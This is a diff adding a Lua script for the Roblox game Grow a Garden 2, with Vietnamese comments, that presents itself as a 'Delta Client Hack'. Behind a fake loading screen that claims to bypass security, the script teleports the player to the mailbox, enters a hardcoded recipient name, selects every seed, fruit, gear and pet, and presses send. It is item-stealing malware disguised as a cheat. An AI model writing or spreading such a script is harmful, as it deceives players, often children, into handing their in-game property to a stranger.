@@ -1,0 +1,262 @@
+-- Delta Client Hack Script - Grow a Garden 2
+-- Script dành cho Delta Executor Client
+
+local player = game.Players.LocalPlayer
+local targetUser = "XQXQXQTTT"
+
+-- ===== DELTA CLIENT LOADING =====
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "DeltaClientHack"
+loadingGui.Parent = player:WaitForChild("PlayerGui")
+loadingGui.Enabled = true
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BackgroundTransparency = 0.3
+bg.BorderSizePixel = 0
+bg.Parent = loadingGui
+
+local deltaLogo = Instance.new("TextLabel")
+deltaLogo.Size = UDim2.new(0.5, 0, 0.12, 0)
+deltaLogo.Position = UDim2.new(0.25, 0, 0.15, 0)
+deltaLogo.BackgroundTransparency = 1
+deltaLogo.Text = "DELTA"
+deltaLogo.TextColor3 = Color3.fromRGB(0, 200, 255)
+deltaLogo.TextScaled = true
+deltaLogo.Font = Enum.Font.GothamBold
+deltaLogo.TextStrokeTransparency = 0.2
+deltaLogo.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+deltaLogo.Parent = bg
+
+local subText = Instance.new("TextLabel")
+subText.Size = UDim2.new(0.4, 0, 0.05, 0)
+subText.Position = UDim2.new(0.3, 0, 0.27, 0)
+subText.BackgroundTransparency = 1
+subText.Text = "CLIENT HACK v3.0"
+subText.TextColor3 = Color3.fromRGB(100, 200, 255)
+subText.TextScaled = true
+subText.Font = Enum.Font.Gotham
+subText.Parent = bg
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.6, 0, 0.03, 0)
+barBg.Position = UDim2.new(0.2, 0, 0.4, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
+barBg.BorderSizePixel = 0
+barBg.Parent = bg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(0.8, 0, 0.05, 0)
+statusText.Position = UDim2.new(0.1, 0, 0.47, 0)
+statusText.BackgroundTransparency = 1
+statusText.TextColor3 = Color3.fromRGB(150, 200, 255)
+statusText.Text = "Delta Client đang khởi tạo..."
+statusText.TextScaled = true
+statusText.Font = Enum.Font.Gotham
+statusText.Parent = bg
+
+local infoText = Instance.new("TextLabel")
+infoText.Size = UDim2.new(0.6, 0, 0.04, 0)
+infoText.Position = UDim2.new(0.2, 0, 0.55, 0)
+infoText.BackgroundTransparency = 1
+infoText.TextColor3 = Color3.fromRGB(80, 120, 160)
+infoText.Text = "Delta Engine v4.2 | Build 2024"
+infoText.TextScaled = true
+infoText.Font = Enum.Font.Gotham
+infoText.TextTransparency = 0.4
+infoText.Parent = bg
+
+-- Loading animation
+local steps = {
+    "Đang kết nối Delta server...",
+    "Đang xác thực license...",
+    "Đang bypass Roblox security...",
+    "Đang inject Delta kernel...",
+    "Đang kích hoạt anti-detection...",
+    "Đang tải navigation system...",
+    "Delta Client đã sẵn sàng!"
+}
+
+for i, stepText in ipairs(steps) do
+    statusText.Text = stepText
+    local targetProgress = i / #steps
+    while barFill.Size.X.Scale < targetProgress do
+        barFill.Size = UDim2.new(math.min(barFill.Size.X.Scale + 0.02, targetProgress), 0, 1, 0)
+        wait(0.03)
+    end
+    wait(0.2)
+end
+
+wait(0.5)
+loadingGui:Destroy()
+
+-- ===== MAIN HACK SCRIPT =====
+print("Delta Client Hack: Script bắt đầu chạy")
+
+-- Đợi nhân vật
+local function waitForCharacter()
+    local char = player.Character
+    if not char then
+        char = player.CharacterAdded:Wait()
+    end
+    return char
+end
+
+-- Dịch chuyển về nhà
+local function teleportToHome()
+    local char = waitForCharacter()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    
+    local spawn = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn")
+    if not spawn then
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("SpawnLocation") then
+                spawn = v
+                break
+            end
+        end
+    end
+    
+    if hrp and spawn then
+        hrp.CFrame = spawn.CFrame + Vector3.new(0, 5, 0)
+        wait(0.5)
+    end
+end
+
+-- Di chuyển sang phải và tương tác
+local function moveRightAndInteract()
+    local char = waitForCharacter()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    
+    if hrp then
+        for i = 1, 40 do
+            hrp.CFrame = hrp.CFrame + Vector3.new(1, 0, 0)
+            
+            -- Kiểm tra vật thể tương tác
+            for _, v in pairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") and v:FindFirstChildOfClass("ClickDetector") then
+                    local dist = (v.Position - hrp.Position).Magnitude
+                    if dist < 5 then
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                            wait(0.3)
+                        end
+                    end
+                end
+                
+                -- Tìm hòm thư
+                if v:IsA("BasePart") and (v.Name:lower():find("mailbox") or v.Name:lower():find("mail")) then
+                    local dist = (v.Position - hrp.Position).Magnitude
+                    if dist < 10 then
+                        hrp.CFrame = v.CFrame + Vector3.new(0, 3, 0)
+                        wait(0.5)
+                        
+                        local detector = v:FindFirstChildOfClass("ClickDetector")
+                        if detector then
+                            fireclickdetector(detector)
+                            wait(1)
+                            return true
+                        end
+                    end
+                end
+            end
+            
+            wait(0.05)
+        end
+    end
+    return false
+end
+
+-- Gửi đồ qua hòm thư
+local function sendItemsToTarget()
+    wait(1)
+    
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Tìm GUI hòm thư
+    local mailGui = nil
+    for _, v in pairs(playerGui:GetChildren()) do
+        if v:IsA("ScreenGui") then
+            local name = v.Name:lower()
+            if name:find("mail") or name:find("send") or name:find("gift") then
+                mailGui = v
+                break
+            end
+        end
+    end
+    
+    if mailGui then
+        -- Nhập tên người nhận
+        for _, v in pairs(mailGui:GetDescendants()) do
+            if v:IsA("TextBox") then
+                v.Text = targetUser
+                wait(0.3)
+                break
+            end
+        end
+        
+        -- Chọn tất cả vật phẩm
+        for _, v in pairs(mailGui:GetDescendants()) do
+            if v:IsA("ImageButton") or v:IsA("TextButton") then
+                local name = v.Name:lower()
+                if name:find("seed") or name:find("fruit") or name:find("gear") or name:find("pet") or name:find("item") or name:find("crop") then
+                    local detector = v:FindFirstChildOfClass("ClickDetector")
+                    if detector then
+                        fireclickdetector(detector)
+                        wait(0.02)
+                    end
+                end
+            end
+        end
+        
+        -- Bấm nút gửi
+        for _, v in pairs(mailGui:GetDescendants()) do
+            if v:IsA("TextButton") or v:IsA("ImageButton") then
+                local text = v.Text:lower()
+                if text:find("send") or text:find("gửi") or text:find("confirm") then
+                    local detector = v:FindFirstChildOfClass("ClickDetector")
+                    if detector then
+                        fireclickdetector(detector)
+                        break
+                    end
+                end
+            end
+        end
+        
+        -- Tìm nút màu xanh
+        for _, v in pairs(mailGui:GetDescendants()) do
+            if v:IsA("TextButton") or v:IsA("ImageButton") then
+                local bgColor = v.BackgroundColor3
+                if bgColor.R < 0.1 and bgColor.G > 0.5 and bgColor.B < 0.1 then
+                    local detector = v:FindFirstChildOfClass("ClickDetector")
+                    if detector then
+                        fireclickdetector(detector)
+                        break
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- ===== CHẠY SCRIPT =====
+teleportToHome()
+moveRightAndInteract()
+sendItemsToTarget()
+
+-- Thông báo thành công
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Delta Client Hack",
+    Text = "✓ Đã gửi tất cả đồ cho " .. targetUser,
+    Duration = 5
+})
+
+print("Delta Client Hack: Hoàn tất! Đã gửi đồ cho " .. targetUser)
